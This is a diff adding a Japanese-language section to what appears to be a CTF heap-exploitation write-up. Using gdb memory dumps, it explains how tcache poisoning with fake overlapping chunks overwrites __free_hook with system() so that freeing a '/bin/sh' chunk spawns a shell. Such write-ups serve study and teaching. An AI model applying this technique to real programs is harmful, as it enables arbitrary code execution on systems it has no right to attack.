@@ -728,8 +728,39 @@ all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0
 0x555555757bc0:	0x0000000000000100	0x0000000000000020
 0x555555757bd0:	0x0000000000000000	0x0000000000000000
 0x555555757be0:	0x0000000000000000	0x0000000000000021
+```
+#### Heapでの system("/bin/sh")実行の流れ
+
+```txt
+------------------------------------------------------------------------------------
+0x40サイズのmallocによって、偽のチャンクの0x555555757a90が返り、tcache[0x100]のnextに_free_hookアドレスを書き込んでfree後
+
+(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
+(0x40)   tcache_entry[2](1): 0x555555757ab0
+(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
+gdb-peda$ x/32gx 0x555555757a60
+0x555555757a60: 0x3636363636363636      0x3636363636363636
+0x555555757a70: 0x3636363636363636      0x3636363636363636
+0x555555757a80: 0x3636363636363636      0x0000000000000041
+0x555555757a90: 0x0000555555757a80      0x0000555555757a80
+0x555555757aa0: 0x0000000000000000      0x0000000000000041 <- この偽のチャンクを使って_free_hookアドレスを書き込み、tcache[0x100]にoverlapさせる
+0x555555757ab0: 0x0000000000000000      0x555555757010
+0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101 <- freeすることでこの偽の0x100chunkに対応するtcache[0x100]に0x555555757ad0を代入(overlapする)
+0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- _free_hookを上書きした
+0x555555757ae0: 0x3737373737373737      0x3737373737373737
+
+
+次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る
+そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
+    これで、次にfreeするとsystem関数が実行される！
+そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む
+この後にfreeすれば、system("/bin/sh")が実行される！
+    free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
+    このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
+    なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！
 
 ```
+
 #### Heap アドレス関係
 ```txt
 libc_base        = addr_libc_mainarena - offset_libc_mainarena
